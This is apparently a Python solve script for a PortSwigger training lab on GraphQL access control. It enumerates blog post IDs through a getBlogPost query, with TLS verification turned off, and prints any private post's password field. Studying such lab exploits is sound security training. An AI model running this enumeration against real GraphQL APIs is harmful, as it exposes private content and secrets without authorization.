#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab: Accessing private GraphQL posts.

The getBlogPost(id: X) resolver returns private posts including their
postPassword field. Enumerate IDs until a private post is found.
"""

import argparse
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

QUERY = """
query getBlogPost {
    getBlogPost(id: %d) {
        id
        title
        isPrivate
        postPassword
    }
}
"""


def find_private_post(lab, session_cookie, max_id=20):
    headers = {"Content-Type": "application/json", "Accept": "application/json"}
    cookies = {"session": session_cookie}

    for post_id in range(1, max_id + 1):
        payload = {"query": QUERY % post_id, "operationName": "getBlogPost"}
        r = requests.post(
            f"{lab}/graphql/v1",
            json=payload,
            headers=headers,
            cookies=cookies,
            verify=False,
        )
        data = r.json().get("data", {}).get("getBlogPost")
        if not data:
            continue
        print(f"[{post_id}] title={data.get('title')!r}  isPrivate={data.get('isPrivate')}  postPassword={data.get('postPassword')!r}")
        if data.get("isPrivate") or data.get("postPassword"):
            print(f"\n[+] Private post found! Password: {data.get('postPassword')}")
            return data.get("postPassword")

    print("[-] No private post found.")
    return None


def main():
    parser = argparse.ArgumentParser(
        description="Solve Accessing Private GraphQL Posts lab"
    )
    parser.add_argument("lab_url", help="Lab base URL")
    parser.add_argument("session", help="session cookie value")
    parser.add_argument("--max-id", type=int, default=20)
    args = parser.parse_args()

    find_private_post(args.lab_url.rstrip("/"), args.session, args.max_id)


if __name__ == "__main__":
    main()
